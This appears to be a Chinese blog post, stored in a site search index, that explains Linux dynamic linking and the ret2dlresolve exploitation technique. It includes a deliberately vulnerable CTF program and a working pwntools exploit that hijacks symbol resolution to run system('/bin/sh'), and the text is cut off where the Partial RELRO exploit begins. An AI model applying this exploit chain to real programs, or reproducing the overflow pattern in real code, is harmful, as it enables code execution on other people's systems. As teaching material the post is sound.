<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Ret2dlresolve攻击解析</title>
    <link href="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Ret2dlresolve攻击解析（Linux动态链接原理）"><a href="#Ret2dlresolve攻击解析（Linux动态链接原理）" class="headerlink" title="Ret2dlresolve攻击解析（Linux动态链接原理）"></a>Ret2dlresolve攻击解析（Linux动态链接原理）</h1><ul><li>本文尝试使用<strong>问题驱动</strong>作为行文思路的方式，使用问答的方式一步一步剖析Linux动态链接原理，并解析<code>ret2dlresolve</code>攻击方法</li></ul><h2 id="Q1：什么是动态链接？"><a href="#Q1：什么是动态链接？" class="headerlink" title="Q1：什么是动态链接？"></a>Q1：什么是动态链接？</h2><ul><li>把链接这个过程<strong>推迟</strong>到了<strong>运行时再进行</strong>，在可执行文件装载时或运行时，由操作系统的装载程序加载库</li></ul><h2 id="Q2：为什么需要动态链接？"><a href="#Q2：为什么需要动态链接？" class="headerlink" title="Q2：为什么需要动态链接？"></a>Q2：为什么需要动态链接？</h2><ul><li>解决静态链接的空间浪费和更新困难问题</li></ul><h2 id="Q3：动态链接的实现？"><a href="#Q3：动态链接的实现？" class="headerlink" title="Q3：动态链接的实现？"></a>Q3：动态链接的实现？</h2><ul><li><p>Linux：<code>.so</code>；Windows：<code>.dll</code></p></li><li><p>共享的是<strong>代码</strong>，私有的是数据</p></li><li><p>共享对象的最终装载地址在编译时是不确定的，而是在装载时，<strong>装载器根据当前地址空间的空闲情况，动态分配一块足够大小的虚拟地址空间给相应的共享对象</strong></p></li></ul><h2 id="Q4：动态链接对象共享难题？"><a href="#Q4：动态链接对象共享难题？" class="headerlink" title="Q4：动态链接对象共享难题？"></a>Q4：动态链接对象共享难题？</h2><ul><li><p>指令部分有两个地方需要在装载时确定</p><ul><li>一是指令访问其他模块的数据。如果其他模块的数据的地址需要再装载时才能确定，这就必须修改指令中的地址</li><li>二是指令中调用其他模块的函数</li></ul></li><li><p>解决方法：<strong>全局偏移表 GOT（global offset table）</strong></p></li></ul><h2 id="Q5：GOT？"><a href="#Q5：GOT？" class="headerlink" title="Q5：GOT？"></a>Q5：GOT？</h2><ul><li>数据段中的一个指针数组：<ul><li><strong>存储</strong>：存放跨模块的数据/函数的地址</li><li><strong>动态修改</strong>：在装载时动态填入</li><li><strong>访问</strong>：通过GOT的指针间接访问</li></ul></li><li>说白了GOT是所有需要动态装载模块的一个wrapper，是一个存放具体跳转地址的指针</li><li>在ELF中，<code>.got</code>用来保存全局变量引用的地址，<code>.got.plt</code>用来保存函数引用的地址</li></ul><h2 id="Q6：x86-PLT过程？"><a href="#Q6：x86-PLT过程？" class="headerlink" title="Q6：x86 PLT过程？"></a>Q6：x86 PLT过程？</h2><p>PLT基本流程：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">/** csapp中GOT指的是（.got.plt + got）**/<br>  PLT[0]:  # 被所有的.plt实体所共享<br>  push *(GOT+4)  # 4.将Module ID（GOT[1]）压入栈<br>  jmp  *(GOT+8)   # 5.调用_dl_runtime_resolve()（GOT[2]），根据id+n完成符号解析与重定位，并将解析地址填入到bar@GOT中（也就是下次就不需要解析了）<br>  ...<br>  ...<br>  bar@plt( PLT[n] ):<br>  jmp  *(bar@GOT)  # 1.如果符号已绑定，则跳转到符号位置；如果未绑定，则跳转到下面<br>  push n   # 2.将符号在重定位表中的下标压入栈<br>  jmp PLT0   # 3.跳转到PLT0处<br></code></pre></td></tr></tbody></table></figure><p>一句话描述：PLT首先会查找<code>.got.plt</code>节（GOT）。如果GOT找不到符号地址（主要由于延迟绑定 lazy-binding），那么PLT将会调用一个动态加载器中的函数<code>_dl_runtime_resolve()</code>：</p><ul><li>在主ELF镜像的<code>.dynstr</code>节中找到NULL为终结符的字符串<code>puts\0</code></li><li>然后在所有加载的共享目标中找到<code>puts</code>的地址（如<code>libc.so.6</code>）</li></ul><p>e.g.</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/1.png"></p><p>在执行完<code>_dl_runtime_resolve()</code>函数之后<code>read@GOT</code>的数据就被修改为装载到堆上的地址，即</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/2.png"></p><p>Q7：<code>.got.plt</code>？</p><ul><li><code>.got.plt</code>前面三项：</li></ul><figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">------------------------<br>.dynamic段地址<br>------------------------<br>本模块ID<br>------------------------<br>_dl_runtime_resolve()地址<br>------------------------<br>导入函数1<br>------------------------<br>导入函数2<br>------------------------<br>...<br>------------------------<br></code></pre></td></tr></tbody></table></figure><ul><li>在GDB中，我们可以看到<code>.got.plt</code>第一个导入函数的地址为<code>0x80498c4</code>：</li></ul><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/3.png"></p><p>根据前面<code>.got.plt</code>的结构，我们可以知晓Module ID地址为<code>0x80498bc</code>，<code>_dl_runtime_resolve()</code>地址为<code>0x80498c0</code></p><h2 id="Q7：-dl-runtime-resolve-？"><a href="#Q7：-dl-runtime-resolve-？" class="headerlink" title="Q7：_dl_runtime_resolve()？"></a>Q7：<code>_dl_runtime_resolve()</code>？</h2><p><code>_dl_runtime_resolve()</code>函数有两个参数，一个是<code>link_map</code>，在本例中为<code>0xf7ffd940</code>，而另一个参数是<code>reloc_index</code>，在本例中为<code>0x8</code>。请注意，这两个参数都是存放在栈中的，由于当前环境为x86，参数是存放在栈上的；但当环境为x64时，<strong>这两个参数仍然是存放在栈中的</strong>，原因也很简单，因为<code>rdi, rsi, rdx(rcx, r8, r9...)</code>现在存放的是被调函数的参数，为了减少额外的保护现场汇编码，这里直接将参数入栈处理。</p><p><code>_dl_runtime_resolve(link_map, reloc_index)</code>做了如下的事：</p><ul><li>找到目标函数名以NULL截断的字符串（如”read”）；</li><li>在所有已经载入的库（共享目标）中寻找该地址；</li><li>将该地址写回<strong>GOT</strong>（即将找到的地址填入<a href="mailto:read@got.plt">read@got.plt</a>中）；</li><li>跳转到<code>read()</code>并执行。</li></ul><p>这里存在一个问题，就是目标函数名是如何找到的？我们将在下一问中进行解答。</p><h2 id="Q8：寻找的函数名是如何确定的？"><a href="#Q8：寻找的函数名是如何确定的？" class="headerlink" title="Q8：寻找的函数名是如何确定的？"></a>Q8：寻找的函数名是如何确定的？</h2><p>总体寻址流程[3]：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/4.png"></p><hr><p>细节：</p><p><strong>.dynamic段：</strong></p><ul><li><p>存放<code>.dynsym</code>和<code>.dynstr</code>地址</p></li><li><p>存放<code>Elf_Dyn</code>实体：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span><br>  Elf32_Sword d_tag;<br>  <span class="hljs-class"><span class="hljs-keyword">union</span> {</span><br>    Elf32_Word d_val;<br>    Elf32_Addr d_ptr;<br>  } d_un;<br>} Elf32_Dyn;<br><br><span class="hljs-comment">// x64</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">{</span><br>  Elf64_Sxword d_tag;                        <span class="hljs-comment">/* Dynamic entry type */</span><br>  <span class="hljs-class"><span class="hljs-keyword">union</span></span><br><span class="hljs-class">    {</span><br>      Elf64_Xword d_val;                     <span class="hljs-comment">/* Integer value */</span><br>      Elf64_Addr  d_ptr;                     <span class="hljs-comment">/* Address value */</span><br>    } d_un;<br>} Elf64_Dyn;<br></code></pre></td></tr></tbody></table></figure></li></ul><p><strong>link_map.l_info</strong>：</p><ul><li>动态加载器存储这些实体的结构体（<code>link_map</code>结构体成员很多[4]，我们仅需关注<code>l_info</code>）</li><li>定义：</li></ul><figure class="highlight applescript"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs applescript">struct link_map<br>  {<br>...    <br>    /* Indexed pointers <span class="hljs-keyword">to</span> dynamic section.<br>       [<span class="hljs-number">0</span>,DT_NUM) are indexed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> processor-independent tags.<br>       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> tag minus DT_LOPROC.<br>       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are indexed <span class="hljs-keyword">by</span> DT_VERSIONTAGIDX(tagvalue).<br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed <span class="hljs-keyword">by</span> DT_EXTRATAGIDX(tagvalue).<br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are indexed <span class="hljs-keyword">by</span> DT_VALTAGIDX(tagvalue) <span class="hljs-keyword">and</span><br>       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM, DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM) are indexed <span class="hljs-keyword">by</span> DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */<br>    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br>...<br></code></pre></td></tr></tbody></table></figure><p>d_tag (dynamic entry type) 定义在<code>elf/elf.h</code>[5]中：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Legal values for d_tag (dynamic entry type).  */</span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_STRTAB5<span class="hljs-comment">/* Address of string table (.dynstr) */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_SYMTAB6<span class="hljs-comment">/* Address of symbol table (.dynsym) */</span></span><br>...<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DT_JMPREL23<span class="hljs-comment">/* Address of PLT relocs (.plt.dyn) */</span></span><br></code></pre></td></tr></tbody></table></figure><p>在Q6中，<code>PLT[0]</code>是有将Module ID的值压入堆栈，而该值就是link_map：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/5.png"></p><p>那link_map到l_info的偏移值是多少呢？A：+8 * 位长（x86：4；x64：8）</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span><br>  {<br>    <span class="hljs-comment">/* These first few members are part of the protocol with the debugger.</span><br><span class="hljs-comment">       This is the same format used in SVR4.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Addr) l_addr;<span class="hljs-comment">/* Difference between the address in the ELF</span><br><span class="hljs-comment">   file and the addresses in memory.  */</span><br>    <span class="hljs-type">char</span> *l_name;<span class="hljs-comment">/* Absolute file name object was found in.  */</span><br>    <span class="hljs-built_in">ElfW</span>(Dyn) *l_ld;<span class="hljs-comment">/* Dynamic section of the shared object.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l_next, *l_prev; <span class="hljs-comment">/* Chain of loaded objects.  */</span><br>    <span class="hljs-comment">/* All following members are internal to the dynamic linker.</span><br><span class="hljs-comment">       They may change without notice.  */</span><br>    <span class="hljs-comment">/* This is an element which is only ever different from a pointer to</span><br><span class="hljs-comment">       the very same copy of this type for ld.so when it is used in more</span><br><span class="hljs-comment">       than one namespace.  */</span><br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">link_map</span> *l_real;<br>    <span class="hljs-comment">/* Number of the namespace this link map belongs to.  */</span><br>    Lmid_t l_ns;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">libname_list</span> *l_libname;<br>    <span class="hljs-built_in">ElfW</span>(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM<br>    + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];<br></code></pre></td></tr></tbody></table></figure><p>即l_info的地址为<code>link_map + 8 * (4/8)</code>，那么有：</p><table><thead><tr><th>Member</th><th>Address</th></tr></thead><tbody><tr><td><code>link_map-&gt;l_info[DT_STRTAB]</code></td><td>link_map_base + (8 + 5 = 13) * (4/8)</td></tr><tr><td><code>link_map-&gt;l_info[DT_SYMTAB]</code></td><td>link_map_base + (8 + 6 = 14) * (4/8)</td></tr><tr><td><code>link_map-&gt;l_info[DT_JMPREL]</code></td><td>link_map_base + (8 + 23 = 31) * (4/8)</td></tr></tbody></table><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/6.png"></p><p>然后我们可以查看<code>.dynstr</code>存放的数据，如下所示：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/7.png"></p><hr><p>至此，我们得到了<code>.rel.plt</code>、<code>.dynstr</code>和<code>.dynsym</code>的地址。接下来，我们根据上述的寻址流程一步一步找到对应的函数名：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/4.png"></p><p>如前所述，<code>reloc_index</code>在此例中为<code>0x8</code>。那么<code>read</code>函数<code>Elf_Rel</code>结构体的地址为<code>0x08048304 + 8 = 0x804830c</code>，即</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/9.png"></p><p>这里显然<code>0x080498c8</code>为<code>r_offset</code>，而<code>0x207</code>为<code>r_info</code>，</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// glibc/elf/elf.h</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_SYM(val)((val) &gt;&gt; 8)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ELF32_R_TYPE(val)((val) &amp; 0xff)</span><br></code></pre></td></tr></tbody></table></figure><p>因此，<code>read</code>对应的<code>Elf_SYM</code>结构体在<code>.dynsym</code>的偏移为<code>ELF32_R_SYM(r_info)= 0x207 &gt;&gt; 8 = 2 </code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">{</span><br>  Elf32_Wordst_name;<span class="hljs-comment">/* Symbol name (string tbl index) (16 bits)*/</span><br>  Elf32_Addrst_value;<span class="hljs-comment">/* Symbol value (16 bits)*/</span><br>  Elf32_Wordst_size;<span class="hljs-comment">/* Symbol size (16 bits)*/</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_info;<span class="hljs-comment">/* Symbol type and binding (8 bits)*/</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>st_other;<span class="hljs-comment">/* Symbol visibility (8 bits) */</span><br>  Elf32_Sectionst_shndx;<span class="hljs-comment">/* Section index (16 bits)*/</span><br>} Elf32_Sym;<br></code></pre></td></tr></tbody></table></figure><p>而<code>sizeof(struct Elf32_Sym)=4*4=0x10</code>（注意这里结构体内存对齐），那么对应<code>Elf_SYM</code>结构体的起始位置为<code>0x080481ac + 0x10 * 0x2 = 0x80481cc</code>，则有</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/10.png"></p><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 哎嘿，这里居然不是地址吗？那这里<code>0x5c</code>是个啥玩意？？我们不妨猜测一下，该地址是搜索字符串在<code>.dynstr</code>的偏移值？我们来验证一下：</p><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/11.png"></p><p>这样一来，我们就得到了函数名，然后链接器将在所有加载的共享代码中找到包含该字符串的函数地址，并将该地址填入GOT表中。</p><h2 id="Q9：X86-Ret2dlresolve"><a href="#Q9：X86-Ret2dlresolve" class="headerlink" title="Q9：X86 Ret2dlresolve"></a>Q9：X86 Ret2dlresolve</h2><h3 id="NO-RELRO"><a href="#NO-RELRO" class="headerlink" title="NO RELRO"></a>NO RELRO</h3><p>NO RELRO，顾名思义，不开启重定向只读保护（<code>.dynamic</code>可读可写），即<code>.dynamic</code>可以被修改。</p><p>对于关闭RELRO的程序来说，最简单的利用方法是修改<code>link_map</code>中的<code>.dynstr</code>的地址。<span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 需要注意的是，修改<code>.dynstr</code>能够成功进行攻击的最根本原因是：<strong>动态链接器根据偏移进行寻址</strong>（很显然不能使用固定的地址寻址，原因是PIE机制会修改程序载入的基址）。</p><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> NO RELRO攻击的具体流程如下：</p><ol><li>在可写内存中构造一个虚假的<code>.dynstr</code>区（将某一函数的字符串替换为另外一个函数，如system、execve等）；</li><li>然后调用写函数将<code>link_map</code>中的存放<code>.dynstr</code>的成员变量替换为上述构造的虚假<code>.dynstr</code>区地址；</li><li><strong>将原函数的GOT的跳转地址修改为PLT的下一条指令地址</strong>（<strong>这里也可以直接RET到PLT的下一条指令</strong>）</li><li>由于步骤3清空的动态链接器之前查找到的地址，因此再调用该函数时，动态链接器会重新调用<code>_dl_runtime_resolve()</code>来查找该函数载入的地址，而此时该函数的字符串已经修改为恶意的函数（如system、execve等），那么最终查找到的地址为恶意函数的地址，由此攻击成功</li></ol><p><strong>Q</strong>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>];<br>    setbuf(<span class="hljs-built_in">stdin</span>, buf);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">256</span>);<br>}<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>] = <span class="hljs-string">"Welcome to XDCTF2015~!\n"</span>;<br>    setbuf(<span class="hljs-built_in">stdout</span>, buf);<br>    write(<span class="hljs-number">1</span>, buf, <span class="hljs-built_in">strlen</span>(buf));<br>    vuln();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z norelro -no-pie main.c -o main_norelro_32<br></code></pre></td></tr></tbody></table></figure><p><strong>EXP</strong>：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># context.log_level="debug"</span><br>context.terminal = [<span class="hljs-string">"tmux"</span>,<span class="hljs-string">"splitw"</span>,<span class="hljs-string">"-h"</span>]<br>context.arch=<span class="hljs-string">"i386"</span><br><br>sh = process(<span class="hljs-string">"./main_no_relro_32"</span>)<br>rop = ROP(<span class="hljs-string">"./main_no_relro_32"</span>)<br>elf = ELF(<span class="hljs-string">"./main_no_relro_32"</span>)<br><br>sh.recvuntil(<span class="hljs-string">b'Welcome to XDCTF2015~!\n'</span>)<br><br>offset = <span class="hljs-number">0x70</span><br>dynstr_addr = <span class="hljs-number">0x08049804</span> + <span class="hljs-number">4</span><br>dynstr = elf.get_section_by_name(<span class="hljs-string">'.dynstr'</span>).data()<br>dynstr = dynstr.replace(<span class="hljs-string">b"read"</span>,<span class="hljs-string">b"system"</span>)<br><br>bss_end_addr = <span class="hljs-number">0x80498e0</span><br><br>read_got_addr = <span class="hljs-number">0x80498c8</span><br>read_plt_addr = <span class="hljs-number">0x8048370</span><br>read_plt_next_addr = <span class="hljs-number">0x08048376</span><br><br>pop_12 = <span class="hljs-number">0x0804834a</span><br><br>rop.raw(<span class="hljs-string">b'a'</span> * offset)<br><span class="hljs-comment"># modify .dynstr pointer</span><br>rop.read(<span class="hljs-number">0</span>, dynstr_addr, <span class="hljs-number">4</span>)<br><span class="hljs-comment"># construct fake .dynstr</span><br>rop.read(<span class="hljs-number">0</span>, bss_end_addr, <span class="hljs-built_in">len</span>(dynstr))<br><span class="hljs-comment"># construct string "/bin/sh"</span><br>rop.read(<span class="hljs-number">0</span>, bss_end_addr + <span class="hljs-built_in">len</span>(dynstr) + <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(<span class="hljs-string">b"/bin/sh\x00"</span>))<br><span class="hljs-comment"># change got of read to next addr of read's plt</span><br>rop.read(<span class="hljs-number">0</span>, read_got_addr, <span class="hljs-number">4</span>)<br>rop.raw(read_plt_addr)<br>rop.raw(<span class="hljs-number">0xdeadbeef</span>)  <span class="hljs-comment"># fake ret</span><br>rop.raw(bss_end_addr + <span class="hljs-built_in">len</span>(dynstr) + <span class="hljs-number">1</span>)  <span class="hljs-comment"># arg1</span><br><br><span class="hljs-keyword">assert</span>(<span class="hljs-built_in">len</span>(rop.chain()) &lt;= <span class="hljs-number">256</span>)<br>rop.raw(<span class="hljs-string">b"a"</span> * (<span class="hljs-number">256</span> - <span class="hljs-built_in">len</span>(rop.chain())))<br><br>sh.send(rop.chain())<br>sh.send(p32(bss_end_addr))<br>sh.send(dynstr)<br>sh.send(<span class="hljs-string">b"/bin/sh\x00"</span>)<br>sh.send(p32(read_plt_next_addr))<br><br>sh.interactive()<br></code></pre></td></tr></tbody></table></figure><blockquote><p>请注意使用python3.7，否则ROP链会存在问题（REL解析出错）</p></blockquote><p><img src="/2023/10/13/Ret2dlresolve%E6%94%BB%E5%87%BB%E8%A7%A3%E6%9E%90/12.png"></p><h3 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h3><p>如下编译源文件：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">gcc -fno-stack-protector -m32 -z relro -z lazy -no-pie ../../main.c -o main_partial_relro_32<br></code></pre></td></tr></tbody></table></figure><p>在Partial RELRO的条件下，<code>.dynamic</code>全部只读，因此不能像上述通过修改指针进行利用。那我们该如何利用了？</p><p>在Q7中，我们知道<code>_dl_runtime_resolve(link_map, reloc_index)</code>的两个参数都是通过PLT传入堆栈的，第2个参数在<code>func@plt</code>中被压入堆栈，第1个参数在<code>PLT[0]</code>中被压入堆栈；<strong>如果我们提前在堆栈中构造<code>reloc_index</code>，并将其指向精心伪造的空间（重定位表项<code>.rel.plt</code>、动态符号表<code>.dynsym</code>和动态字符串<code>.dyn_str</code>），那么就可以混淆动态载入的函数了</strong>。</p><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 此攻击能够成功的原因在于——<strong>动态链接器寻址使用相对偏移量</strong>：</p><ul><li>reloc_index: index of .rel.plt item</li><li>r_info: index of .dynsym item</li><li>st_name: index of string of .dynstr</li></ul><p>Partial RELRO具体攻击步骤：</p><ol><li>跳转到<code>PLT[0]</code>：<code>PLT[X]（X&gt;0）</code>中进行的操作是将<code>reloc_index</code>压入栈（相应的，也要提前把函数参数送入栈中），这里提前构造虚假的<code>reloc_index</code>指向我们自己构造的<code>Elf_Rel</code>项，然后跳转到<code>PLT[0]</code>，接着往堆栈中压入<code>link_map</code>，紧接着就是调用<code>_dl_runtime_resolve</code>；</li><li>在虚假的<code>Elf_Rel</code>项中，构造虚假的<code>r_info</code>指向虚假的<code>.dynsym</code>的<code>Elf_Sym</code>项（这里由于<code>r_info</code>过大可能会导致检查version hash时出错，这里需要调整<code>.dynsym</code>的地址）</li><li>在虚假的<code>Elf_Sym</code>项中，<code>st_name</code>指向虚假的字符串，如<code>system</code>；</li></ol><p>尝试一下：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 